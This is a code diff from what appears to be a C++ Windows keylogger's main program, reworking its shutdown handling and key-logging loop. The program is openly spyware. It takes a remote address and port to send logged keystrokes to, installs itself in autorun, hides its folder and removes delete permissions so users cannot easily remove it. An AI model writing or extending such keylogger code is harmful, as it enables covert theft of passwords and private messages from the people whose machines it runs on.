@@ -17,26 +17,12 @@ bool IsProcessRunning() {
 	return false;
 }
 
-BOOL WINAPI ShutdownHandler(DWORD dwCtrlType)
-{
-	if (dwCtrlType == CTRL_SHUTDOWN_EVENT || dwCtrlType == CTRL_LOGOFF_EVENT)
-	{
-		keylogger->~Keylogger();
-		ReleaseMutex(m_singleInstanceMutex);
-		ExitProcess(0);
-		return TRUE;
-	}
-	return FALSE;
-}
-
 int wmain(int argc, wchar_t* argv[]) {
 	bool flag = IsProcessRunning();
 	if (argc < 4)
 		MessageBox(NULL, L"Pass address, port and flushThreshold as params to this executable", NULL, 0);
 	if (argc < 4 || flag)
 		return 0;	
-
-	SetConsoleCtrlHandler(ShutdownHandler, TRUE);
 
 	std::locale::global(std::locale("ru_RU.UTF-8"));
 	std::wistringstream ss(argv[3]);
@@ -57,16 +43,16 @@ int wmain(int argc, wchar_t* argv[]) {
 		std::vector<std::wstring> args = { argv[1],argv[2],argv[3] };
 		Resilience::AddToAutorun(L"C:\\Keylogger\\keylogger.exe", L"keylogger.exe", args);
 		Resilience::HideFolder(L"C:\\Keylogger");
-		Resilience::RemoveDeletePermissionFromFolder(L"C:\\Keylogger");
-		
+		Resilience::RemoveDeletePermissionFromFolder(L"C:\\Keylogger");		
 	}
 
 	keylogger = new Keylogger(client, new Filter(filters));
 	
-	while (true) {
-		keylogger->logKeys();
-		Sleep(50);
-	}
+	keylogger->LogKeys();
+
+	keylogger->~Keylogger();
+	ReleaseMutex(m_singleInstanceMutex);
+
 
 	return 0;
 }
